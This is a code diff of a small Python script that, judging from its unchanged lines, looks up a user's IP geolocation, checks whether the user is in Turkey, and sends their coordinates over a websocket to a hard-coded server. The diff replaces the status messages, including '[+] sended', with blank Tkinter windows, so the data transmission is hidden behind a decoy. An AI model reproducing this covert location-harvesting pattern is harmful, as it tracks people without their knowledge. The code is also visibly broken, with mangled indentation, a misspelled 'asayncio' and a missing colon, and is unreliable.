@@ -2,7 +2,7 @@ import requests
 import json
 import asyncio
 import websockets
-
+from tkinter import *
 
 SERVER_WS = "ws://192.168.1.53:8765"
 
@@ -19,12 +19,23 @@ async def send(datainfo):
          await ws.send(json.dumps(datainfo))
 
 
+def pro1():
+    root = Tk()
+    root.geometry('100×100')
+    root.title('daya')
+    root.mainloop()
+
+def pro2():
+    root = Tk()
+    root.geometry('200×200')
+    root.title('error')
+    root.mainloop()
 
 def main():
      info = get_ip_info()
 
 if not is_turk(info):
-   print('Error uses not in turkey')
+   pro2()
    return # stop
 lat, lot = map(float,info["loc"].split(","))
 datainfo = {
@@ -36,7 +47,7 @@ datainfo = {
 }
 
 asayncio.run(send(datainfo))
-print("[+] sended")
+pro1()
   
 if __name__ =="__main__"
     main()
